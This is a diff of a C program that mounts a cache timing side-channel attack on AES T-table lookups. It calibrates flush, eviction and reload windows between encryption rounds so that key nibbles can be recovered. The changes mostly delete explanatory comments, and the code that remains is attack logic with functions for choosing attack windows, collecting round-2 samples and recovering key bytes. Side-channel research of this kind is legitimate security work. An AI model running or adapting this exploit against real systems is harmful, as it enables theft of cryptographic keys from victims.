@@ -644,25 +644,6 @@ static void calibrate_phase_timing(control_block_t *control,int calibration_trac
 }
 
 
-/*
- * automatic safe-window search
- *
- * For each calibration trace:
- *
- *   safe start <= round-2 start - operation duration
- *
- * and:
- *
- *   safe start >= round-1 end
- *
- * The best fixed start time is the timestamp contained in the
- * largest number of those safe intervals.
- *
- * The same construction is reused verbatim for the round-2/round-3
- * window: substitute round2_end for round1_end, and round3_start
- * for round2_start.
- */
-
 static double choose_best_safe_window(const uint64_t *left,const uint64_t *right,int count,uint64_t *out_window){
     timing_event_t *events=calloc((size_t)count*2,sizeof(timing_event_t));
     if(events==NULL)die("calloc window events");
@@ -746,8 +727,6 @@ static attack_windows_t choose_attack_windows(const timing_profile_t *timing,con
         }
 
         //round-2/round-3 window: mirrors the phase3_evict_right construction
-        //above, one round later (round2_end in place of round1_end's role,
-        //round3_start in place of round2_start's role).
         if(timing->round3_start_offset[i]>=primitive->flush_all_guard){
             phase4_evict_right[i]=timing->round3_start_offset[i]-primitive->flush_all_guard;
         } else {
@@ -760,10 +739,7 @@ static attack_windows_t choose_attack_windows(const timing_profile_t *timing,con
 
     windows.phase3_reload_window=percentile_u64(timing->round2_end_offset,timing->count,round2_reload_percentile);
 
-    //round-2/round-3 eviction window: same construction as
-    //phase3_evict_window, using round2_end as the left bound (the
-    //earliest safe point, mirroring round1_end above) and
-    //phase4_evict_right as the right bound (mirroring phase3_evict_right).
+    //round-2/round-3 eviction window
     windows.phase4_evict_coverage_percent=choose_best_safe_window(timing->round2_end_offset,phase4_evict_right,timing->count,&windows.phase4_evict_window);
 
     int reload_after_count=0;
@@ -871,7 +847,7 @@ static void print_attack_windows(const attack_windows_t *windows,const primitive
 }
 
 
-//phase 2 -- round-1 window
+//phase 2 - round-1 window
 static int recover_high_nibble_windowed(int byte_index,void *ttable,control_block_t *control,uint64_t baseline[TOTAL_LINES],uint64_t window,int repeat_count){
     int table=byte_index%4;
     int table_base=table*16;
@@ -1142,14 +1118,6 @@ static void recover_low_group(second_round_group_t group,const uint8_t high[16],
 
 
 //phase 3 sample collection
-//
-//Collects a round-2 T-table trace exactly as before (evict round-1,
-//wait for the calibrated post-round-2 point, reload all lines). After
-//that capture, it additionally performs the round2->round3 eviction
-//at phase4_evict_window, mirroring the round1->round2 eviction above
-//with no new logic. This round-3 eviction is not read back or used
-//for recovery -- it exists only so the round-2/round-3 window is
-//actually exercised, matching the real pipeline
 //(flush->round1->reload->flush->round2->reload->round3).
 static void collect_round2_sample_windowed(void *ttable,control_block_t *control,uint64_t baseline[TOTAL_LINES],uint64_t evict_window,uint64_t reload_window,uint64_t phase4_evict_window,round2_sample_t *sample){
     random_plaintext(sample->plaintext);
@@ -1185,10 +1153,6 @@ static void collect_round2_sample_windowed(void *ttable,control_block_t *control
     }
 
     //round2->round3 eviction: same construction as the round1->round2
-    //eviction above, performed at the calibrated phase-4 window so the
-    //attacker also exercises the gap between round 2 and round 3. This
-    //happens after the round-2 reload has already been captured, so it
-    //cannot affect round-2 recovery; round 3 itself is not sampled.
     if(phase4_evict_window>reload_window){
         busy_wait_until(t0,phase4_evict_window);
     }
@@ -1300,18 +1264,9 @@ int main(int argc,char **argv){
 
     print_attack_windows(&windows,&primitive,operation_percentile,round2_reload_percentile);
 
-    //the timestamps are now discarded.
-    //from this point onward the attack never reads the victim's round timestamp fields.
+
     free_timing_profile(&timing);
 
-    //fail cleanly when no usable window exists
-    //this is particularly important for no-sleep builds.
-    //if the measured flush+reload operation cannot fit inside
-    //the measured natural inter-round gap, do not pretend that
-    //the resulting trace is a clean round-1/round-2 trace.
-    //(the round-2/round-3 window, phase4, is not required for key
-    //recovery, so it is not part of this fail-fast gate -- only
-    //reported.)
     if(windows.phase2_coverage_percent<=0.0||windows.phase3_evict_coverage_percent<=0.0){
 
         fprintf(
